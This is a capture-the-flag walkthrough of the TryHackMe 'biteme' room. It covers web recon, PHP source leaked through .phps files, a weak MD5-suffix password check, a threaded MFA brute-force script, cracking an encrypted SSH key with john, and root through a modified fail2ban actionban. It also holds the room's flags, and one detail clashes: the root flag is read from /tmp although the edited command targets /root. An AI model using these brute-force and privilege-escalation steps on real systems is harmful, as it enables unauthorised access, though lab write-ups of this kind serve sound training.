CTF URL:https://tryhackme.com/r/room/biteme
# IP
```
10.10.231.81
```
# Reconaisance
## NMAP
```bash
nmap -p- -T4 10.10.231.81 -Pn -v
# 22
# 80
```
## WEB
### Dirb
```bash
dirb http://10.10.231.81/
# result
http://10.10.231.81/console/
```
### Nikto
```bash
nikto -h 10.10.231.81
# result
```
### Other interesting things
##### Directories
```
http://10.10.231.81/console/securimage/

/*!
 * Securimage CAPTCHA Audio Library
 * https://www.phpcaptcha.org/
 * 
 * Copyright 2015 phpcaptcha.org
 * Released under the BSD-3 license
 * See https://github.com/dapphp/securimage/blob/master/README.md
 */
```

##### Handle Submit
```js
function handleSubmit() {
        eval(function(p,a,c,k,e,r){e=function(c){return c.toString(a)};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('0.1(\'2\').3=\'4\';5.6(\'@7 8 9 a b c d e f g h i... j\');',20,20,'document|getElementById|clicked|value|yes|console|log|fred|I|turned|on|php|file|syntax|highlighting|for|you|to|review|jason'.split('|'),0,{}))
        return true;
      }
```
or
```js
function handleSubmit() {
  eval(
    (function (p, a, c, k, e, r) {
      e = function (c) {
        return c.toString(a)
      }
      if (!''.replace(/^/, String)) {
        while (c--) {
          r[e(c)] = k[c] || e(c)
        }
        k = [
          function (e) {
            return r[e]
          },
        ]
        e = function () {
          return '\\w+'
        }
        c = 1
      }
      while (c--) {
        if (k[c]) {
          p = p.replace(new RegExp('\\b' + e(c) + '\\b', 'g'), k[c])
        }
      }
      return p
    })(
      "0.1('2').3='4';5.6('@7 8 9 a b c d e f g h i... j');",
      20,
      20,
      'document|getElementById|clicked|value|yes|console|log|fred|I|turned|on|php|file|syntax|highlighting|for|you|to|review|jason'.split(
        '|'
      ),
      0,
      {}
    )
  )
  return true
}
```
Some message that says about php syntax highlighting. 
`https://www.php.net/manual/en/function.highlight-file.php`
So,
## phps
`http://10.10.231.81/console/index.phps`
```php
<?php
session_start();

include('functions.php');
include('securimage/securimage.php');

$showError = false;
$showCaptchaError = false;

if (isset($_POST['user']) && isset($_POST['pwd']) && isset($_POST['captcha_code']) && isset($_POST['clicked']) && $_POST['clicked'] === 'yes') {
    $image = new Securimage();

    if (!$image->check($_POST['captcha_code'])) {
        $showCaptchaError = true;
    } else {
        if (is_valid_user($_POST['user']) && is_valid_pwd($_POST['pwd'])) {
            setcookie('user', $_POST['user'], 0, '/');
            setcookie('pwd', $_POST['pwd'], 0, '/');
            header('Location: mfa.php');
            exit();
        } else {
            $showError = true;
        }
    }
}
?>
```
`http://10.10.231.81/console/functions.phps`
```php
 <?php
include('config.php');

function is_valid_user($user) {
    $user = bin2hex($user);

    return $user === LOGIN_USER;
}

// @fred let's talk about ways to make this more secure but still flexible
function is_valid_pwd($pwd) {
    $hash = md5($pwd);

    return substr($hash, -3) === '001';
} 
```
`http://10.10.231.81/console/config.phps`
```php
 <?php

define('LOGIN_USER', '6a61736f6e5f746573745f6163636f756e74'); 
```
Username - `6a61736f6e5f746573745f6163636f756e74` that is some hex
Password - some md5 hash that end with `001`
```python
import hashlib

target = '001'
candidate = 0
while True:
    plaintext = str(candidate)
    hash = hashlib.md5(plaintext.encode('ascii')).hexdigest()
    if hash[-3:] == target:
        print('plaintext:"' + plaintext + '", md5:' + hash)
        break
    candidate += 1

```
`plaintext:"5265", md5:f127a3f714240273e254d740ed23f001`

`jason_test_account:5265`

then it gives MFA page which has following function
```js
      function handleSubmit() {
        eval(function(p,a,c,k,e,r){e=function(c){return c.toString(a)};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('0.1(\'@2 3 4 5 6 7 8 9 a b c, d e f g h... i\');',19,19,'console|log|fred|we|need|to|put|some|brute|force|protection|on|here|remind|me|in|the|morning|jason'.split('|'),0,{}));
        return true;
      }
```
`mfabrute.py`
```python
import requests
from concurrent.futures import ThreadPoolExecutor

def make_request(i):
    url = 'http://10.10.231.81/console/mfa.php'
    cookies = {
        'PHPSESSID': 'r54a1u070ubtubf5jptvqcvivb',
        'user': 'jason_test_account',
        'pwd': '5265'
    }
    data = {
        'code': str(i)
    }
    response = requests.post(url, cookies=cookies, data=data)
    word_count = len(response.text.split())
    print(f"Code: {i}, Word Count: {word_count}")

num_threads = 10

# Using ThreadPoolExecutor to make concurrent requests
with ThreadPoolExecutor(max_workers=num_threads) as executor:
    # Submitting tasks to the executor
    futures = [executor.submit(make_request, i) for i in range(1, 10001)]

    # Ensuring all futures complete
    for future in futures:
        future.result()

```
Result: `1510`
# user flag
it opens a file browser and reader.
`/user/jason/flag.txt`:
`THM{6fbf1fb7241dac060cd3abba70c33070}`
# getting into system
`/home/jason/.ssh`
```
authorized_keys
id_rsa
id_rsa.pub
```
`id_rsa`
```
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,983BDF3BE962B7E88A5193CD1551E9B9

nspZgFs2AHTCqQUdGbA0reuNel2jMB/3yaTZvAnqYt82m6Kb2ViAqlFtrvxJUTkx
vbc2h5vIV7N54sHQvFzmNcPTmOpy7cp4Wnd5ttgGpykiBTni6xeE0g2miyEUu+Qj
JaLEJzzdiehg0R3LDqZqeuVvy9Cc1WItPuKRLHJtoiKHsFvm9arbW4F/Jxa7aVgH
l5rfo6pEI0liruklDfFrDjz96OaRtdkOpM3Q3GxYV2Xm4h/Eg0CamC7xJC8RHr/w
EONcJm5rHB6nDVV5zew+dCpYa83dMViq7LOGEZ9QdsVqHS59RYEffMc45jkKv3Kn
ky+y75CgYCWjtLbhUc4Ml21kYz/pDdObncIRH3m6aF3w/b0F/RlyAYQYUYGfR3/5
Y9a2/hVbBLX7oM+KQqWHD5c05mLNfAYWTUxtbANVy797CSzYssMcCrld7OnDtFx7
qPonOIRjgtfCodJuCou0o3jRpzwCwTyfOvnd29SF70rN8klzjpxvqNEEbSfnh04m
ss1fTMX1eypmCsHecmpjloTxdPdj1aDorwLkJZtn7h+o3mkWG0H8vnCZArtxeiiX
t/89evJXhVKHSgf83xPvCUvnd2KSjTakBNmsSKoBL2b3AN3S/wwapEzdcuKG5y3u
wBvVfNpAD3PmqTpvFLClidnR1mWE4r4G1dHwxjYurEnu9XKO4d+Z1VAPLI2gTmtd
NblKTwZQCWp20rRErOyT9MxjT1gTkVmpiJ0ObzQHOGKJIVaMS8oEng2gYs48nugS
AsafORd3khez4r/5g9opRj8rdCkK83fG5WA15kzcOJ+BqiKyGU26hCbNuOAHaAbq
Zp+Jqf4K6FcKsrL2VVCmPKOvkTEItVIFGDywp3u+v0LGjML0wbrGtGzP7pPqYTZ5
gJ4TBOa5FUfhQPAJXXJU3pz5svAHgTsTMRw7p8CSfedCW/85bMWgzt5XuQdiHZA0
FeZErRU54+ntlJ1YdLEjVWbhVhzHyBXnEXofj7XHaNvG7+r2bH8GYL6PeSK1Iiz7
/SiK/v4kjOP8Ay/35YFyfCYCykhdJO648MXb+bjblrAJldeXO2jAyu4LlFlJlv6/
bKB7viLrzVDSzXIrFHNoVdFmLqT3yEmui4JgFPgtWoHUOQNUw8mDdfCR0x3GAXZP
XIU1Yn67iZ9TMz6z8HDuc04GhiE0hzI6JBKJP8vGg7X8rBuA7DgoFujSOg7e8HYX
7t07CkDJcAfqy/IULQ8pWtEFTSXz1bFpl360v42dELc6BwhYu4Z4qza9FtYS0L/d
ts5aw3VS07Xp5v/pX+RogV8uIa0jOKTkVy5ZnnlJk1qa9zWX3o8cz0P4TualAn+h
dQBVNOgRIZ11a6NU0bhLCJTL2ZheUwe9MTqvgRn1FVsv4yFGo/hIXb6BtXQE74fD
xF6icxCBWQSbU8zgkl2QHheONYdfNN0aesoFGWwvRw0/HMr4/g3g7djFc+6rrbQY
xibeJfxvGyw0mp2eGebQDM5XiLhB0jI4wtVlvkUpd+smws03mbmYfT4ghwCyM1ru
VpKcbfvlpUuMb4AH1KN0ifFJ0q3Te560LYc7QC44Y1g41ZmHigU7YOsweBieWkY2
-----END RSA PRIVATE KEY-----
```

```bash
ssh2john id_rsa > hash
john hash --wordlist=/usr/share/wordlists/rockyou.txt
# 1a2b3c4d
chmod 600 id_rsa
ssh -i id_rsa jason@10.10.231.81
```

# Root Flag
as Jason
```bash
jason@biteme:~$ sudo -l
Matching Defaults entries for jason on biteme:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jason may run the following commands on biteme:
    (ALL : ALL) ALL
    (fred) NOPASSWD: ALL
```

```bash
sudo -u fred bash

fred@biteme:~$ sudo -l
Matching Defaults entries for fred on biteme:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User fred may run the following commands on biteme:
    (root) NOPASSWD: /bin/systemctl restart fail2ban

```
Then according to https://grumpygeekwrites.wordpress.com/2021/01/29/privilege-escalation-via-fail2ban/ article, modification in `/etc/fail2ban/action.d` can give us privilege. 
add `actionban = chmod 777 /root/root.txt` to `iptables-multiport.conf` and `sudo /bin/systemctl restart fail2ban`

Then ssh login several times with fail. As A result

```bash
fred@biteme:~$ cat /tmp/root.txt 
THM{0e355b5c907ef7741f40f4a41cc6678d}
```